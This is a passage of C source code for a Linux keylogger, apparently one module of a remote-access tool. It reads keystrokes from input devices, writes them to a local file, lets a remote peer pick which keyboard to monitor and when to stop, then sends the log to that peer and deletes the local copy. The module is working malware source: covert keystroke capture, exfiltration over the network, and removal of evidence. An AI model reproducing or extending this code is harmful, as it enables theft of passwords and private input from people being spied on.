        fprintf(stderr, "         (no common keyboard keys found)\n");
        fprintf(stderr, "         Continuing anyway...\n\n");
    }

    return 1;
}

/**
 * Print device information
 */
static void print_device_info(int fd)
{
    char            name[256] = "Unknown";
    char            phys[256];
    struct input_id id;
    int             has_name = 0;
    int             has_phys = 0;
    int             has_id   = 0;

    if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) >= 0)
    {
        printf("Device name: %s\n", name);
        has_name = 1;
    }

    // Guard against empty string from EVIOCGPHYS
    if (ioctl(fd, EVIOCGPHYS(sizeof(phys)), phys) >= 0 && phys[0] != '\0')
    {
        printf("Physical path: %s\n", phys);
        has_phys = 1;
    }

    if (ioctl(fd, EVIOCGID, &id) >= 0)
    {
        printf("Device ID: bus=0x%04x vendor=0x%04x product=0x%04x version=0x%04x\n",
               id.bustype, id.vendor, id.product, id.version);
        has_id = 1;
    }

    // Only mention missing info if we at least got the name
    if (has_name && !has_phys && !has_id)
    {
        printf("(No physical path or device ID available)\n");
    }
}

/**
 * Capture and display key events from device
 */
static void capture_keys(const char *device_path)
{
    int                fd;
    struct input_event ev;
    ssize_t            n;
    fd_set             readfds;
    struct timeval     tv;
    int                ret;
    int                corrected_code;
    uint32_t           scan_for_fix;
    int                was_fixed;

    fd = open(device_path, O_RDONLY);
    if (fd < 0)
    {
        perror("Error opening device");
        fprintf(stderr, "Hint: Try running with sudo\n");
        return;
    }

    if (!verify_device(fd))
    {
        close(fd);
        return;
    }

    FILE *logf = fopen("./keyboard.txt", "a");
    if (!logf)
    {
        fprintf(stderr, "open /tmp/keyboard.txt failed: %s\n", strerror(errno));
        return;
    }

    fprintf(logf, "Capturing key events from: %s\n", device_path);
    printf("Capturing key events from: %s\n", device_path);
    print_device_info(fd);
    printf("Press Ctrl+C to stop...\n");
    printf("==================================================================================\n");
    printf("%-15s %-10s %-20s %-15s %-30s\n",
           "RelTime", "Type", "Code", "Value", "Modifiers");
    printf("==================================================================================\n");

    fprintf(logf, "==================================================================================\n");
    fprintf(logf, "%-15s %-10s %-20s %-15s %-30s\n",
            "RelTime", "Type", "Code", "Value", "Modifiers");
    fprintf(logf, "==================================================================================\n");

    while (running)
    {
        FD_ZERO(&readfds);
        FD_SET(fd, &readfds);

        tv.tv_sec  = 0;
        tv.tv_usec = 100000; // 100ms for responsive Ctrl+C

        ret = select(fd + 1, &readfds, NULL, NULL, &tv);

        if (ret < 0)
        {
            if (errno == EINTR)
            {
                continue;
            }
            perror("select error");
            break;
        }
        else if (ret == 0)
        {
            continue;
        }

        n = read(fd, &ev, sizeof(ev));

        // Handle EOF
        if (n == 0)
        {
            fprintf(stderr, "Device closed (EOF)\n");
            break;
        }

        // Handle short reads
        if (n != sizeof(ev))
        {
            if (n < 0)
            {
                perror("read error");
                break;
            }
            fprintf(stderr, "Warning: Short read (%zd bytes, expected %zu)\n",
                    n, sizeof(ev));
            continue;
        }

        // Track scan codes from MSC_SCAN events (cast handles any signedness)
        if (ev.type == EV_MSC && ev.code == MSC_SCAN)
        {
            last_scan_code       = (uint32_t)ev.value;
            last_scan_code_valid = 1;
            last_scan_consumed   = 0; // Fresh scan code, not yet used
        }

        if (ev.type == EV_KEY)
        {
            // Get scan code for fix only if valid and not already consumed
            scan_for_fix = (last_scan_code_valid && !last_scan_consumed) ? last_scan_code : 0;

            // Fix Parallels bugs
            corrected_code = fix_parallels_key_code(ev.code, scan_for_fix, &was_fixed);

            // Mark scan as consumed when we use it
            if (scan_for_fix != 0)
            {
                last_scan_consumed = 1;
            }

            print_relative_time(&ev.time, logf);
            fprintf(logf, " %-10s %-20s %-15s",
                    event_type_to_string(ev.type),
                    code_to_string(ev.type, corrected_code),
                    value_to_string(ev.type, ev.code, ev.value));
            printf(" %-10s %-20s %-15s",
                   event_type_to_string(ev.type),
                   code_to_string(ev.type, corrected_code),
                   value_to_string(ev.type, ev.code, ev.value));

            // Print modifiers BEFORE updating (shows state at time of event)
            print_modifiers(logf);

            // Show if we applied a fix (using separate buffers to avoid static buffer collision)
            if (was_fixed)
            {
                char raw_buf[32], fixed_buf[32];
                printf(" [FIXED: %s->%s]",
                       code_to_string_buf(ev.type, ev.code, raw_buf, sizeof(raw_buf)),
                       code_to_string_buf(ev.type, corrected_code, fixed_buf, sizeof(fixed_buf)));
            }

            printf("\n");
            fprintf(logf, "\n");
            fflush(stdout);

            // Update modifiers AFTER printing for next event
            update_modifiers(corrected_code, ev.value);

            printed_since_syn = 1;
        }
        else if (ev.type == EV_SYN && ev.code == SYN_REPORT)
        {
            // Only print event boundary if we've printed KEY events since last boundary
            if (printed_since_syn)
            {
                print_relative_time(&ev.time, logf);
                fprintf(logf, " %-10s %-20s %-15s [---event boundary---]\n",
                        event_type_to_string(ev.type),
                        code_to_string(ev.type, ev.code),
                        value_to_string(ev.type, ev.code, ev.value));
                printf(" %-10s %-20s %-15s [---event boundary---]\n",
                       event_type_to_string(ev.type),
                       code_to_string(ev.type, ev.code),
                       value_to_string(ev.type, ev.code, ev.value));
                fflush(stdout);
                printed_since_syn = 0;
            }
        }
        else
        {
            // Other events (MSC, LED, etc.) - don't trigger boundary markers
            print_relative_time(&ev.time, logf);
            fprintf(logf, " %-10s %-20s %-15s\n",
                    event_type_to_string(ev.type),
                    code_to_string(ev.type, ev.code),
                    value_to_string(ev.type, ev.code, ev.value));
            printf(" %-10s %-20s %-15s\n",
                   event_type_to_string(ev.type),
                   code_to_string(ev.type, ev.code),
                   value_to_string(ev.type, ev.code, ev.value));
            fflush(stdout);
            // Don't set printed_since_syn for non-KEY events
        }
    }

    close(fd);
    fclose(logf);
    printf("\nCapture stopped.\n");
}

static void *receive_thread_key(void *arg)
{
    receiver_args_t *args   = (receiver_args_t *)arg;
    char            *output = NULL;

    if (receive_string(args->ip_ctx, &output) == 0 && output)
    {
        printf("Received: %s\n", output);
        running = 0;
        free(output);
    }
    else
    {
        printf("[receiver] receive_string failed or connection closed\n");
    }

    free(args);
    return NULL;
}

static int start_receive_thread_key(ip_info ip_ctx, pthread_t *thread_out)
{
    pthread_t        tid;
    receiver_args_t *args = malloc(sizeof(*args));
    if (!args)
        return -1;

    args->ip_ctx = ip_ctx;

    if (pthread_create(&tid, NULL, receive_thread_key, args) != 0)
    {
        free(args);
        return -1;
    }

    if (thread_out)
        *thread_out = tid;

    return 0;
}

static int delete_file(const char *path)
{
    if (unlink(path) != 0)
    {
        fprintf(stderr, "unlink('%s') failed: %s\n", path, strerror(errno));
        return -1;
    }
    return 0;
}

int start_keylogging(ip_info ip_ctx)
{
    char  *output = NULL;
    char   paths[64][PATH_MAX_LEN];
    size_t path_count = 0;
    char   buffer[8192];
    running = 1;

    discover_keyboards(buffer, sizeof(buffer), paths, 64, &path_count);
    printf("%s", buffer);

    send_string(ip_ctx, buffer);

    receive_string(ip_ctx, &output);

    char *end;
    errno = 0;

    long choice = strtol(output, &end, 10);

    if (errno != 0)
    {
        perror("strtol");
    }
    else if (end == output)
    {
        printf("No digits were found\n");
    }
    else if (*end != '\0' && *end != '\n')
    {
        printf("Invalid characters in input\n");
    }
    else
    {
        printf("Choice as int: %ld\n", choice);
    }

    printf("Chosen: %s\n", paths[choice - 1]);

    pthread_t tid;

    if (start_receive_thread_key(ip_ctx, &tid) != 0)
    {
        perror("pthread_create");
    }

    capture_keys(paths[choice - 1]);

    send_file(ip_ctx, "./keyboard.txt");

    delete_file("./keyboard.txt");

    pthread_join(tid, NULL);

    return 0;
}
